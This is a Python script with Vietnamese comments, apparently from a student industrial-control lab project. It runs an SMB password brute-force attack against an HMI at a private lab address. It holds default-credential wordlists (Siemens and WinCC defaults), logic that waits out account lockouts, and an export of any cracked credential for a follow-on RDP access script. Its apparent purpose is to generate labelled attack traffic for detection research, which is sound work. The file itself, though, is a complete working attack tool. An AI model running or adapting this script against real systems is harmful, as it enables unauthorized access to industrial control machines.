#!/usr/bin/env python3
"""
KỊCH BẢN 3: SMB Brute Force vào HMI .31
Chạy: python tests/test_smb_brute.py
Output: test_results/smb_brute_<TS>/
"""

import json, datetime, time, itertools, os
import json, datetime, time, itertools, os
import smbprotocol.connection
from smbprotocol.connection import Connection
from smbprotocol.session import Session
# ════════════════════════════════════════════════════
# CONFIG
# ════════════════════════════════════════════════════
TARGET     = "192.168.210.31"
BASE_DIR   = r"C:\Users\admin\Documents\iiot\do-an"
TS         = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
OUTPUT_DIR = os.path.join(BASE_DIR, "test_results", f"smb_brute_{TS}")
os.makedirs(OUTPUT_DIR, exist_ok=True)

USERNAMES = [
    "Administrator",
    "administrator",
    "admin",
    "Admin",            # ← tên thật trên máy .31
    "operator",
    "engineer",
]

PASSWORDS = [
    "",
    "admin",
    "Admin",
    "admin123",
    "Admin@123",
    "password",
    "Password1",
    "123456",
    "Siemens1",
    "Siemens1!",
    "siemens",
    "WinCC",
    "wincc123",
    "1234567890",
    "operator",
    "Operator1",
    "P@ssw0rd",
    "hocvien",
    "hocvien123",
    "Hocvien@123",
]

MAX_ATTEMPTS_PER_USER  = 8
DELAY_BETWEEN_ATTEMPTS = 2
COOLDOWN_AFTER_LIMIT   = 620

# ════════════════════════════════════════════════════
# BANNER
# ════════════════════════════════════════════════════
print("=" * 55)
print("  KỊCH BẢN 3: SMB BRUTE FORCE — HMI .31")
print("=" * 55)
print(f"  Target    : {TARGET}")
print(f"  Thời gian : {TS}")
print(f"  Kết quả   : {OUTPUT_DIR}")
print(f"  Lockout   : max {MAX_ATTEMPTS_PER_USER}/user, cooldown {COOLDOWN_AFTER_LIMIT}s")
print("=" * 55)

# ════════════════════════════════════════════════════
# HÀM CORE — impacket SMB2
# ════════════════════════════════════════════════════


def try_smb(username, password):
    conn = None
    try:
        import uuid
        conn = Connection(uuid.uuid4(), TARGET, 445)
        conn.connect()
        session = Session(conn, username, password)
        session.connect()
        session.disconnect()
        return True, "success"
    except Exception as e:
        err = str(e)
        if "STATUS_LOGON_FAILURE" in err or "logon_failure" in err.lower():
            return False, "auth_failed"
        if "STATUS_ACCOUNT_LOCKED_OUT" in err:
            return False, "locked_out"
        return False, err
    finally:
        if conn:
            try: conn.disconnect()
            except: pass


# ════════════════════════════════════════════════════
# BRUTE FORCE
# ════════════════════════════════════════════════════
print(f"\n  Usernames : {len(USERNAMES)}")
print(f"  Passwords : {len(PASSWORDS)}")
print(f"  Tổng thử  : {len(USERNAMES) * len(PASSWORDS)}\n")

results            = []
found              = None
user_attempt_count = {u: 0 for u in USERNAMES}

for idx, (user, pwd) in enumerate(itertools.product(USERNAMES, PASSWORDS), 1):

    # ── Lockout guard ──
    if user_attempt_count[user] >= MAX_ATTEMPTS_PER_USER:
        print(f"\n  [⏸] '{user}' đã thử {MAX_ATTEMPTS_PER_USER} lần — cooldown {COOLDOWN_AFTER_LIMIT}s")
        for remaining in range(COOLDOWN_AFTER_LIMIT, 0, -10):
            print(f"  [⏳] Còn {remaining}s...", end="\r", flush=True)
            time.sleep(10)
        print(f"\n  [✅] Cooldown xong — tiếp tục\n")
        user_attempt_count[user] = 0

    print(f"[{idx:>3}] {user}:{pwd:<20}", end="", flush=True)
    success, raw = try_smb(user, pwd)
    user_attempt_count[user] += 1

    results.append({
        "attempt_num" : idx,
        "username"    : user,
        "password"    : pwd,
        "success"     : success,
        "raw_response": raw,
        "label"       : "attack_bruteforce",
        "protocol"    : "SMB2",
        "port"        : 445,
        "timestamp"   : datetime.datetime.now().isoformat(),
    })

    if success:
        print("✅ THÀNH CÔNG!")
        found = {"username": user, "password": pwd}
        break

    # ── Dừng nếu bị lock ──
    if raw == "locked_out":
        print(f"\n  [🔒] Tài khoản '{user}' bị LOCK — bỏ qua user này")
        user_attempt_count[user] = MAX_ATTEMPTS_PER_USER
    else:
        print("❌")

    time.sleep(DELAY_BETWEEN_ATTEMPTS)

# ════════════════════════════════════════════════════
# LƯU KẾT QUẢ
# ════════════════════════════════════════════════════
output = {
    "target"           : TARGET,
    "attack_type"      : "smb_bruteforce",
    "attack_label"     : 1,
    "credential_found" : found,
    "total_attempts"   : len(results),
    "success_count"    : sum(1 for r in results if r["success"]),
    "fail_count"       : sum(1 for r in results if not r["success"]),
    "attempts"         : results,
}

out_file = os.path.join(OUTPUT_DIR, "smb_brute_result.json")
with open(out_file, "w", encoding="utf-8") as f:
    json.dump(output, f, indent=2, ensure_ascii=False)

# ════════════════════════════════════════════════════
# TỔNG KẾT
# ════════════════════════════════════════════════════
print("\n" + "=" * 55)
print("  TỔNG KẾT SMB BRUTE FORCE")
print("=" * 55)
print(f"  Tổng thử  : {len(results)}")
print(f"  Thành công: {sum(1 for r in results if r['success'])}")
print(f"  Thất bại  : {sum(1 for r in results if not r['success'])}")
print(f"  Credential: {found['username'] + ':' + found['password'] if found else '❌ Không tìm được'}")
print(f"  Kết quả   : {out_file}")
print("=" * 55)

# Export credential để test_rdp_access.py đọc
cred_file = os.path.join(OUTPUT_DIR, "credential.json")
with open(cred_file, "w") as f:
    json.dump(found or {}, f, indent=2)
print(f"[+] Credential export: {cred_file}")
